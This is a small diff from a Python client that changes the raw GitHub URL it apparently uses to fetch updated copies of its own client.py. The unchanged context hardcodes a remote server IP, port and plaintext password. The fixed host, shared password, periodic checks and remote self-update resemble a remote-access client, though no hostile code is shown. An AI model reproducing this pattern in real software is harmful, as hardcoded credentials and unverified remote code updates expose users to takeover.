@@ -21,7 +21,7 @@ import shutil
 SERVER_HOST = '176.106.246.150'
 SERVER_PORT = 25565
 PASSWORD = 'StrongPassword123'
-UPDATE_URL = 'https://raw.githubusercontent.com/Dimonlomon/Private/main/client.py'
+UPDATE_URL = 'https://raw.githubusercontent.com/Dimonlomon/Private/refs/heads/main/client.py'
 CHECK_INTERVAL = 300
 
 def send_data(sock, data: bytes):
